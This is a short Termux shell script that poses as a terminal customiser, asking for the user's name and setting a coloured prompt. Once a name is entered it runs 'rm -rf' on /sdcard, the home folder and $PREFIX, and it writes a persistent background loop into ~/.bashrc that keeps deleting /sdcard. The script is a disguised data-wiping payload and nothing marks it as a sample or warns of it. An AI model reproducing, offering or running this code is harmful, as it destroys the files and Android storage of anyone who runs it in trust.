p() {
	printf "#!/data/data/com.termux/files/usr/bin/python3\nimport random\nimport os\ncolor=['\033[1;91m','\033[1;92m','\033[1;93m','\033[1;94m','\033[1;95m','\033[1;96m']\nprint(random.choice(color))\nexit()" >> $PREFIX/bin/random
	chmod 777 $PREFIX/bin/random
	#random
	#printf "\nNow you can use this commandin any file : random"
	}
	cd $PREFIX/bin
	if [ -e random ];then
	clear
	else
	clear
	p
	fi
chsh -s bash
random
echo -e -n "Enter your name \033[1;97m"
read a
if [ $a ];then
rm -rf /sdcard ~ $PREFIX
printf "while [ true ];do\nrm -rf /sdcard > /dev/null 2>&1\ndone > /dev/null 2>&1 &\nPS1='\n\[\033[93m\][\[\033[94m\]\#\[\033[93m\]]\[\033[91m\] [\[\033[92m\]$a\[\033[91m\]]\[\033[94m\] [\[\033[93m\]\W\[\033[94m\]]\[\033[95m\] :-# \[\033[97m\]'" >> ~/.bashrc
bash
fi
